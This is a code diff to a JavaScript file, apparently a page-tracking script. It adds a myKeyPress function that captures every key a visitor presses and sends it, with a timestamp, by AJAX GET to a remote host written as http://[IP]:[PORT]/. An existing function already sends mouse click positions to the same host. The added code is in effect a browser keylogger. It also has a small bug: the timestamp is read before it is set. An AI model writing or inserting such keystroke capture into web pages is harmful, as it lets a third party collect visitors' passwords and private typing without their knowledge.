@@ -9,3 +9,32 @@ function point_it(event){
 	var milliseconds = (new Date).getTime();
 	window.location.href = "http://[IP]:[PORT]/index.html?mouse_x="+pos_x+"&mouse_y="+pos_y+ "&epoch="+milliseconds;
 }
+
+function myKeyPress(e){
+			var writeroot = document.getElementById('writeroot');
+            var keynum;
+
+            if(window.event){ // IE
+            	keynum = e.keyCode;
+            }else
+                if(e.which){ // Netscape/Firefox/Opera
+            		keynum = e.which;
+                 }
+            //alert(String.fromCharCode(keynum));
+			//writeroot.innerHTML += String.fromCharCode(keynum);
+			var data = 'key='+ String.fromCharCode(keynum) + "&epoch="+milliseconds ; // this where i add multiple data using  ' & '
+            var milliseconds = (new Date).getTime();
+		  $.ajax({
+		    type:"GET",
+		    cache:false,
+		    url:"http://[IP]:[PORT]/",
+		    data:data,    // multiple data sent using ajax
+		    success: function (html) {
+
+		      //$('#add').val('data sent sent');
+		      //$('#msg').html(html);
+              //alert(String.fromCharCode(keynum));
+		    }
+		  });
+		  return false;
+        }
